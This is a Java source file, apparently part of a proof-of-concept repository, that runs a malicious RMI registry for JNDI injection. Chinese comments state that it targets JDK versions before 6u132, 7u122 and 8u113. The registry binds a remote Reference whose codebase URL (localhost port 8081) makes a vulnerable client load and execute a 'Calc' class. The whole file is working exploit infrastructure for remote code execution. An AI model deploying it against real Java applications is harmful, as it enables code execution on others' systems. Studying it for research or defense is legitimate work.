package main.java.Server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.io.File;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * Created by metaStor on 2020/7/11.
 */
// JNDI注入利用方式，仅适用于JDK版本：JDK 6u132, JDK 7u122, JDK 8u113之前
public class JNDIServer {

    public static void start() throws
            AlreadyBoundException, RemoteException, NamingException {
        Registry registry = LocateRegistry.createRegistry(1099); //rmi服务器绑定1099端口
        Reference reference = new Reference("Calc",
                "Calc", "http://127.0.0.1:8081/");  //请求本地8080端口
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Calc", referenceWrapper); //绑定工厂类，即rmi将去本地web目录下去找Calc.class
    }

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        System.out.println(new File("").getAbsolutePath());
        start();
    }
}
